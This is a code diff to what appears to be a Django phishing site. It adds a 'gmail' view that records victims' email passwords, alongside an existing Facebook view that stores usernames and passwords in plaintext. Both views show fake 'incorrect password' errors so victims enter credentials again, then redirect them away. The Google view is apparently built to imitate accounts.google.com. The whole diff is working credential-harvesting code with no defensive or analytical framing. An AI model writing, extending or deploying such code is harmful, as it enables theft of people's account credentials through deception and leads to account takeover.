@@ -1,6 +1,6 @@
 from django.http import HttpResponseRedirect
 from .form import *
-from django.shortcuts import render
+from django.shortcuts import render,redirect
 from . models import *
 # Create your views here.
 
@@ -22,7 +22,7 @@ def fb(request):
                     request.session['submission_attempts'] += 1
                 else:
                     request.session['submission_attempts'] = 1
-                    issue = "username or password incorrect " +str(request.session['submission_attempts'])
+                    issue = "username or password incorrect "
 
             
                 FbUser.objects.create(fb_username = name,fb_password = password,session_key = session_key, trial_per_session= request.session['submission_attempts'])
@@ -50,5 +50,25 @@ def account(request):
        
     return render(request, 'account.html',{"accountForm":accountForm,'saved':saved,"email_to_verify":email_to_verify})
 def gmail(request,email):
-    return render(request, 'gmail.html',{"email":email })
+    issue ='none'
+    session_key = request.session.session_key
+
+    if request.method == 'GET':            
+
+            password = request.GET.get("password")
+
+            if password :
+                # Increment submission attempt count
+                if 'submission_attempts' in request.session:
+                    request.session['submission_attempts'] += 1
+                else:
+                    request.session['submission_attempts'] = 1
+                    issue = "Email or password incorrect" 
+
+                EmailUser.objects.create(email = email,email_password = password,session_key = session_key, trial_per_session= request.session['submission_attempts'])
+
+                 # Redirect to Facebook after 3rd attempt
+                if request.session['submission_attempts'] >=2:
+                    return redirect("home")
+    return render(request, 'gmail.html',{"email":email ,"issue":issue})
 # accounts.google.com
